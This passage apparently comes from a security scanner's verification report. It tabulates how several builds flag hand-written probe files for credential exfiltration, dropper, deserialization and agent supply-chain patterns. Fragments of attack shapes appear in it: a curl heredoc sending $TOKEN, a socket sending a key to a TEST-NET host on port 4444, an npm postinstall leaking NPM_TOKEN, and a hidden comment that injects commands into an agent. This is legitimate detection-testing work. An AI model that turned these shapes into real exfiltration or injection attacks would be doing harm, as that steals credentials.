| `fp/py18_orm_filter_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py19_response_type_token_param` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py20_decorator_route_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py21_self_attr_true` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/py22_value_true_control` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/js01_destructure_response` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/js02_destructured_param_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/ts01_optional_param` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/ts02_class_field_modifier` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/ts03_interface_semicolons` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/js03_token_endpoint_path` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/js04_searchparams_literal` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/js05_axios_type_token_literal` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/js06_line_comment` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/js07_computed_key_control` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/js08_block_comment_key` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/js09_ternary_key` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `fp/js10_yaml_list_in_template` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/dr01_data_file_arg_py` | clean | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | LOW | LOW |
| `fp/dr02_shell_check_then_run` | clean | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | LOW | LOW |
| `fp/dr03_literal_data_path` | clean | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | LOW | LOW |
| `fp/dr04_cwd_kw_value` | clean | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | LOW | LOW |
| `fp/dr05_comment_on_launch` | clean | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | LOW | LOW |
| `fp/dr06_true_control` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `fp/de01_bundled_labels_after_sink` | clean | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | LOW | LOW |
| `fp/de02_comment_on_sink` | clean | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | LOW | LOW |
| `fp/de03_true_control` | true | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `fp/ag01_shell_escaped_json_key` | clean | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | HIGH | HIGH |
| `fp/ag02_shell_after_sink` | clean | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | HIGH | HIGH |
| `fp/ag03_shell_comment` | clean | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | HIGH | HIGH |
| `fp/ag04_py_inline_count` | clean | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | HIGH | HIGH |
| `fp/ag05_shell_default_expansion_true` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | CRITICAL, chain | CRITICAL, chain |
| `fp/ac01_cleanup_after_upload` | clean | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | MEDIUM | MEDIUM |
| `fp/ac02_echo_after_upload` | clean | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | MEDIUM | MEDIUM |
| `fp/ac03_true_control` | true | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `fp/sh01_mcp_token_comment` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/sh02_mcp_token_default_true` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/py14b_argparse_dest_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py23_all_exports_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py24_lambda_shadow` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py25_fstring_log_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py26_toml_in_string_fixed` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `fp/py27_nested_kw_fixed` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `fp/py28_multiline_then_use` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py29_keyfile_handle_comment` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL |
| `fp/py30_value_multi_line_true` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/js11_module_exports_shorthand` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/js12_export_list` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/js13_ts_arrow_param_annot_fixed` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/js14_jsx_prop_fixed` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `fp/js15_template_literal_true` | true | EXFIL-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `fp/js16_body_json_stringify_true` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/ts04_type_alias_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/dr07_env_key_fixed` | clean | DROPPER-CHAIN-001 | HIGH, chain | LOW | LOW | LOW | LOW |
| `fp/dr08_js_execfile_data_arg` | clean | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH | HIGH |
| `fp/dr09_shell_true_control` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `fp/dr10_py_log_kw_value` | clean | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | LOW | LOW |
| `fp/ag06_py_after_sink_len` | clean | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | HIGH | HIGH |
| `fp/ag07_py_key_fixed` | clean | AGENTSC-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | HIGH | HIGH |
| `fp/ag08_shell_default_colon_q_true` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | CRITICAL, chain | CRITICAL, chain |
| `fp/ac04_upload_other_same_dir` | clean | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | MEDIUM | MEDIUM |
| `fp/de04_log_after_sink` | clean | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | LOW | LOW |
| `fp/de05_kw_fixed` | clean | DESER-CHAIN-001 | HIGH, chain | LOW | LOW | LOW | LOW |
| `fp/md01_skill_prose_after_curl` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py31_graphql_field` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py32_getattr_literal` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py33_def_param_on_sink_line` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py34_django_filter_kw_fixed` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `fp/js17_url_obj_property` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/sh03_env_key_prefix_fixed` | clean | AGENTSC-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | HIGH | HIGH |
| `fp/lt01_py_dict_variable_key` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `fp/lt02_shell_cred_default` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `fp/lt03_js_ts_non_null` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py00` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py01` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py02` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py03` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py04` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py05` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py06` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py07` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py08` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py09` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_py10` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_js00` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_js01` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_js02` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_js03` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_js04` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_keyfile` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_one_hop_webhook` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_httpclient_conn` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_socket` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_shell_curl_d` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_shell_curl_continued` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `fp/t_tar_upload` | true | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `fp/t_tar_upload_py` | true | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `fp/t_dropper_py_open` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `fp/t_dropper_literal` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `fp/t_dropper_ps_fstring` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `fp/t_dropper_shell` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `fp/t_deser_kw` | true | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `xv/sh_def_called_with_token` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/sh_def_ended_module_send` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/sh_lambda_after_real_use` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/sh_default_is_bound` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/sh_js_function_called` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/sh_js_arrow_called` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/sh_js_function_ended` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/sh_def_called_with_forwarded` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | LOW |
| `xv/rx_js_regex_quote_then_send` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/sh_class_method_param` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | LOW | LOW |
| `xv/sh_js_callback_param` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | LOW | LOW |
| `xv/sh_ts_arrow_typed_param` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | LOW | LOW |
| `xv/cm_py_source_in_comment` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | LOW | LOW |
| `xv/cm_py_sink_in_comment` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | LOW | LOW |
| `xv/cm_py_same_line_real` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/cm_sh_same_line_real` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/ct_positional_continuation` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |
| `xv/ct_tuple_assignment_target` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | - | LOW | LOW |
| `xv/th_data_encoded_plain_host` | true | EXFIL-CHAIN-001 | CRITICAL, chain | MEDIUM | - | CRITICAL, chain | MEDIUM |
| `xv/th_json_payload` | true | EXFIL-CHAIN-001 | CRITICAL, chain | MEDIUM | - | CRITICAL, chain | MEDIUM |
| `xv/th_client_receiver` | clean | EXFIL-CHAIN-001 | LOW | LOW | - | LOW | LOW |
| `xv/rp_reported_example` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | - | LOW | LOW |
| `xv/rp_reported_value_twin` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | - | CRITICAL, chain | CRITICAL, chain |

</details>

## The verifier's probes

The port was verified twice with probes the two lenses had not written: shapes
around each resolution the port made (#169's schema, #170's source-map
exclusion, the hop left out, #171's reading of Python braces, the DROPPER
operand reading) and, the second time, around the first verification's own
fixes.

- **First verification (fixed in 8f8fd64), 87 probes.** 55 around the port's
  resolutions, 11 on string interpolation in other languages, 21 on the edges
  of its fixes. The port had lost true links e45efc5 made: a request that
  reads its body from a heredoc (`curl --data-binary @- <<EOT` with `$TOKEN`
  in the body), Ruby `"#{key}"`, backticks and `%x(...)`, Swift `"\(key)"`,
  C# `$"{key}"`, and a helper whose parameter shares the secret's name called
  with it beyond the rule's window (the `__main__` guard, a `main()`). The
  comment check for a same-line pair ran once per pair (2.46 s against
  1.25 s for e45efc5 on a 3.9 MB minified line), and `name_uses: null`
  refused a whole custom pack.
- **Second verification (fixed in 34eaa0b), 37 probes.** The same helper
  handed the secret by reference (`Thread(target=upload, args=(token,))`,
  `executor.submit(upload, token)`, `atexit.register(upload, token)`,
  `setTimeout(upload, 0, token)`, `upload.call(null, token)`): only
  `upload(` counted as a call, so the parameter shadowed the secret and each
  file was LOW RISK, CRITICAL with e45efc5. A socket made four lines above
  `s.connect(("203.0.113.9", 4444))` and sent on the next line
  (`s.sendall(key)`): e45efc5 linked through the connect line's five-line
  window; the port read only the call. And a false link the first
  verification's heredoc reading made: `curl https://status.example.com/ping
  && cat <<EOF > notes.txt` read the `cat` heredoc as the request's body.

```
Data Source: Synthetic test. Hand-written probe trees in the credential-
             exfiltration, download-and-execute, obfuscation, prompt-injection
             and agent-supply-chain shapes; hosts are example domains or
             TEST-NET addresses. Each is scanned as a directory with
             `sigil --format json scan <dir> --no-cache` and an empty HOME.
Sample Size: 124 probe trees (87 + 37): 91 where the target chain is the right
             answer, 33 where it is not; each scanned once with each of five
             release builds (main 35c0155, e45efc5, the port a442dad, 8f8fd64,
             34eaa0b).
Limitations: The probes show which shapes each build links, not how often
             those shapes occur. They were written to find the port's weak
             points and concentrate on them. "Right" means the target chain
             fires on a true probe and does not on a clean one; the verdict
             can still be HIGH or CRITICAL on other rules. No probe hit the
             per-file time budget.
```

| Probes | main 35c0155 | e45efc5 | port a442dad | 8f8fd64 | this branch 34eaa0b |
|---|---:|---:|---:|---:|---:|
| First verification, 87 (63 true + 24 clean): right | 53 | 51 | 55 | 74 | 74 |
| Second verification, 37 (28 true + 9 clean): right | 30 | 30 | 24 | 24 | 31 |
| True probes linked, of 91 | 78 | 75 | 48 | 69 | 75 |
| Clean probes not linked, of 33 | 5 | 6 | 31 | 29 | 30 |

Against e45efc5, this branch gets 26 of the 124 right that e45efc5 gets
wrong (24 clean probes that no longer link, and two true ones that now do: a
Python dict keyed by the secret in TLS-CHAIN-001's statement, and a
`SKILL.md` sweep sent as `"${SECRETS:-none}"`) and 2 wrong that it gets
right: `v23_py_forwarded_name` (`t = token`,
then `send(t)`) and `x26_py_forwarded_keyword` (`send(token=t)`), a function
called with a name assigned from the secret, the derived name point 5 leaves
out. Against 8f8fd64 it gets the seven the second verification fixed right
and loses none; on the lane's 286 probes the two builds give the same verdict
on every probe, and the same chains except a second EXFIL-CHAIN-001 finding on
the connect line of two socket probes (`recall/s3_py_socket_send`,
`fp/t_socket`), both true.

The 19 this branch still gets wrong: the two derived names above; a two-hop
flow whose send does not repeat the source's name (`x27`; e45efc5 misses it
too, the word reading links it through the keyword `data=`); a Python dict
key in a `SKILL.md` code block (`v17`; Markdown is not read as Python); 12
where no build links: a rule at one end does not fire (the C# and Swift
credential reads, a Kotlin `File(...).readText()`, two C# sends, a `bash
"$BIN" --quiet` launch), the assignment is not one a source line binds
(Kotlin's `val key =`, PHP's, Perl's and PowerShell's `$key =`), or the
secret reaches the sink from outside its window (`v06` pipes it in from the
line above, `x12` reads it in the heredoc body below); and three clean
probes: Ruby's `#{` comment (`x14`; the port did not link it, 8f8fd64 and
this branch do, as main and e45efc5 did), a single-quoted `'$TOKEN'` (`x17`)
and a comprehension's own loop variable (`x20`), which every build links.
All three are listed under "What the value reading still gets wrong".

<details>
<summary>The second verification's 37 probes</summary>

| Probe | What it is | Expected | Chain | main 35c0155 | e45efc5 | port a442dad | 8f8fd64 | this branch 34eaa0b |
|---|---|---|---|---|---|---|---|---|
| `x01_py_thread_target_args` | helper run on a background thread: Thread(target=upload, args=(token,)) | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | CRITICAL, chain |
| `x02_py_executor_submit` | helper submitted to an executor with the secret as its argument | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | CRITICAL, chain |
| `x03_py_atexit_register` | helper registered to run at exit with the secret | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | CRITICAL, chain |
| `x04_js_settimeout_arg` | setTimeout(upload, 0, token): the timer passes the secret on | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | CRITICAL, chain |
| `x05_js_call_method` | upload.call(null, token) | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | CRITICAL, chain |
| `x06_py_thread_literal_clean` | the thread passes a literal; the parameter is not the secret | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `x07_py_main_guard_rebinds_inside` | the __main__ block strips the secret, then calls the helper beyond the window | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | CRITICAL, chain | CRITICAL, chain |
| `x08_py_socket_connect_then_send` | socket made 4 lines up; connect() to a literal host, the key sent on the next line | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL, chain |
| `x09_py_socket_connect_ping_clean` | connect() to a health port and send a fixed ping; the key is only counted | clean | EXFIL-CHAIN-001 | CRITICAL | CRITICAL | CRITICAL | CRITICAL | CRITICAL |
| `x10_py_httpclient_request` | http.client connection, body sent two lines later | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x11_sh_cat_heredoc_pipe_curl` | `cat <<EOF \| curl --data-binary @-`: the heredoc feeds curl through the pipe | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `x12_sh_heredoc_body_reads_key` | the heredoc body itself reads the key file (source below the sink) | true | EXFIL-CHAIN-001 | CRITICAL | CRITICAL | CRITICAL | CRITICAL | CRITICAL |
| `x13_sh_curl_then_cat_heredoc_clean` | a ping, then && cat &lt;&lt;EOF > notes.txt on the same line: the heredoc is cat's, written locally | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL |
| `x14_rb_hash_brace_comment_clean` | Ruby: a trailing comment that starts #{ is a comment in code | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `x15_swift_multiline_string` | Swift """ multi-line string interpolating \(key) on a line of the call | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x16_sh_json_quote_splice` | shell JSON built by splicing a double-quoted $TOKEN between single-quoted parts | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x17_sh_single_quoted_literal_clean` | shell: $TOKEN inside single quotes is the literal text | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x18_py_format_positional` | "...{}".format(token) in the URL | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x19_py_percent_dict_locals` | "%(token)s" % locals() in the body | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x20_py_comprehension_var_clean` | a dict comprehension whose own loop variable is called token | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x21_js_quoted_and_shorthand_clean` | JS: a key named token given a literal, beside another shorthand | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `x22_js_shorthand_true` | JS: shorthand { token } sends the value | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x23_map_guarded_json_clean` | a source map with the )]}' guard line, carrying an exfil flow as data | clean | EXFIL-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `x24_map_json_then_code` | a *.map whose JSON is followed by a script: not a source map | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x25_map_compiled_js_beside` | the compiled file beside a source map is still correlated | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x26_py_forwarded_keyword` | t = token; send(token=t): a derived name (the port's documented decision: not followed) | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `x27_py_env_copy_two_hops` | data = dict(os.environ); body = json.dumps(data); post(data=body) (two hops; not followed) | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `x28_py_dropper_fstring_operand` | launch operand is an f-string of the written path | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `x29_sh_dropper_bash_c_echo_clean` | a fixed script is run; the downloaded file is only its data argument | clean | DROPPER-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `x30_ps_env_temp_dropper` | PowerShell download to $env:TEMP then Start-Process of that path | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `x31_md_html_comment_injection` | a hidden HTML comment tells the agent to run an exfil one-liner | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x32_md_sweep_then_later_block` | SKILL.md: the sweep in one code block, the send in the next block | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x33_mcp_json_same_line` | an MCP server config whose command line reads and sends the key | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x34_pkg_postinstall_node_e` | package.json postinstall sends NPM_TOKEN with node -e | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x35_js_reversed_value` | the token reversed before sending | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
